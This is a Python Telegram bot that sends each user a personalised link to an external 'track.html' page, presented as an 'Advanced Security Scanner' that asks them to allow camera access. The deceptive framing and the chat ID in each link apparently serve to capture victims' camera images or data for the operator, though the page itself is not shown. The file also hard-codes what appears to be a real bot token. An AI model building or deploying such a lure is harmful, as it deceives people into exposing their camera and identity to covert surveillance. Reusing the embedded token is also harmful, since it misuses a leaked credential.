from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

BOT_TOKEN = "8279598676:AAFwYVtwI2O4F4713fqMyhw1JXXxkpiw_18"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or f"user_{user_id}"
    
    # Your HTML URL with user parameters
    html_url = f"https://topwebzlink.rf.gd/track.html?chat_id={user_id}&user={username}"
    
    message = f"""
🔐 **Advanced Security Scanner**

🌐 **Your Personal Tracking URL:**
{html_url}

📸 **Instructions:**
1. Click the link above
2. Allow camera access when prompted  
3. Wait for system scan to complete

⚠️ **This URL is unique to you. Keep it secure.**
"""
    
    await update.message.reply_text(message)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🤖 **Bot Commands:**
/start - Get your personal tracking URL
/help - Show this help message

🔧 **Need Help?**
If the tracking link doesn't work, make sure you've uploaded track.html to your website.
"""
    await update.message.reply_text(help_text)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stats_text = f"""
📊 **Your Stats:**
🆔 User ID: `{user_id}`
👤 Username: @{update.effective_user.username or 'N/A'}
🔗 Your Tracking URL: https://topwebzlink.rf.gd/track.html?chat_id={user_id}
"""
    await update.message.reply_text(stats_text, parse_mode='Markdown')

def main():
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    # Start bot
    print("🤖 Bot is running...")
    print(f"📝 Bot Username: @{application.bot.username}")
    application.run_polling()

if __name__ == '__main__':
    main()